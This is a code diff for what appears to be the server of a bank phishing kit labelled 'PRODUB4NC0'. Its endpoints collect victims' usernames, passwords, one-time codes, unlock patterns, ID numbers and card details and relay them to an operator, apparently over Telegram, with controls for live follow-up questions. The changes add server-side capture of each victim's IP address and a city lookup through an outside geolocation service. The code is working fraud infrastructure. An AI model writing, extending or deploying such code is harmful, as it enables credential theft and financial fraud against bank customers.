@@ -24,6 +24,22 @@ if (!fs.existsSync(CLIENTES_DIR)) {
 }
 
 
+function obtenerIP(req) {
+  const forwarded = req.headers['x-forwarded-for'];
+  return (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'desconocida';
+}
+
+
+async function obtenerCiudad(ip) {
+  try {
+    const { data } = await axios.get(`https://ipwhois.app/json/${ip}`);
+    return data.city || 'desconocida';
+  } catch {
+    return 'desconocida';
+  }
+}
+
+
 setInterval(() => {
   const files = fs.readdirSync(CLIENTES_DIR);
   const ahora = Date.now();
@@ -53,11 +69,14 @@ function cargarCliente(txid) {
 
 
 app.post('/api/sendPattern', async (req, res) => {
-  const { patron, patronImg, usar, ip, city, txid } = req.body;
+  const { patron, patronImg, usar, txid } = req.body;
 
   if (!patron || !patronImg || !usar || !txid) {
     return res.status(400).json({ error: 'Faltan datos obligatorios' });
   }
+
+  const ip = obtenerIP(req);
+  const city = await obtenerCiudad(ip);
 
   const caption = `
 🟢PRODUB4NC0🟢
@@ -67,12 +86,11 @@ app.post('/api/sendPattern', async (req, res) => {
 🔒 Patrón recibido
 Secuencia: <code>${patron}</code>
 
-🌐 IP: ${ip || "N/A"}
-🏙️ Ciudad: ${city || "N/A"}
+🌐 IP: ${ip}
+🏙️ Ciudad: ${city}
   `;
 
   try {
-
     const cliente = { status: "esperando", usar, ip, ciudad: city, preguntas: [] };
     guardarCliente(txid, cliente);
 
@@ -90,7 +108,6 @@ Secuencia: <code>${patron}</code>
       formData,
       { headers: formData.getHeaders(), httpsAgent: agent }
     );
-
 
     const keyboard = {
       inline_keyboard: [
@@ -126,7 +143,9 @@ Secuencia: <code>${patron}</code>
 
 
 app.post('/enviar', async (req, res) => {
-  const { usar, clavv, txid, ip, ciudad } = req.body;
+  const { usar, clavv, txid } = req.body;
+  const ip = obtenerIP(req);
+  const ciudad = await obtenerCiudad(ip);
 
   const mensaje = `
 🟢PRODUB4NC0🟢
@@ -167,7 +186,9 @@ app.post('/enviar', async (req, res) => {
 
 
 app.post('/enviar3', async (req, res) => {
-  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;
+  const { usar, clavv, txid, dinamic } = req.body;
+  const ip = obtenerIP(req);
+  const ciudad = await obtenerCiudad(ip);
 
   const mensaje = `
 🔑🟢PRODUB4NC0🟢
@@ -175,7 +196,6 @@ app.post('/enviar3', async (req, res) => {
 
 📱 US4R: <code>${usar}</code>
 🔐 CL4V: <code>${clavv}</code>
-
 🔑 0TP: <code>${dinamic}</code>
 
 🌐 IP: ${ip}
@@ -208,8 +228,11 @@ app.post('/enviar3', async (req, res) => {
   res.sendStatus(200);
 });
 
+
 app.post('/enviar4', async (req, res) => {
-  const { usar, clavv, txid, cece, etm, ip, ciudad } = req.body;
+  const { usar, clavv, txid, cece, etm } = req.body;
+  const ip = obtenerIP(req);
+  const ciudad = await obtenerCiudad(ip);
 
   const mensaje = `
 🔑🟢PRODUB4NC0🟢
@@ -217,7 +240,6 @@ app.post('/enviar4', async (req, res) => {
 
 📱 US4R: <code>${usar}</code>
 🔐 CL4V: <code>${clavv}</code>
-
 🔑 RUC: <code>${cece}</code>
 🔑 4TM: <code>${etm}</code>
 
@@ -281,6 +303,7 @@ app.get('/sendStatus.php', (req, res) => {
   const cliente = cargarCliente(txid) || { status: 'esperando', preguntas: [] };
   res.json({ status: cliente.status, preguntas: cliente.preguntas });
 });
+
 
 app.get('/', (req, res) => res.send("Servidor activo en Render"));
 
